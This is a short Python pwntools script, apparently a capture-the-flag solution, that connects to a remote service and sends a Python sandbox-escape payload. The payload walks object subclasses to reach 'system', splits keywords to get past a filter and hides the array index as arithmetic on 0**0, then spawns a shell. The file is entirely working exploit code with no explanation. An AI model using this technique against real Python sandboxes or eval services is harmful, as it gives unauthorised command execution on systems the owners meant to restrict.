from pwn import remote

host = '192.214.171.83'
port = 3001

conn = remote(host, port)

text = conn.recvuntil(b'> ').decode()
print(text, end='')

index = '(0**0<<((((0**0<<0**0)<<0**0)<<0**0)-0**0))-(-(0**0<<0**0<<0**0)-(0**0<<0**0))'
#print('DEBUG: index = ', eval(index))
payload = '().__class__.__base__.__subclasses__()[' + index + '].__init__.__globals__["sy""stem"]("s""h")'
conn.writeline(payload.encode())
print(payload)

text = conn.recvuntil(b'> ').decode()
print(text, end='')

conn.writeline(b'q')
print('q')
conn.close()
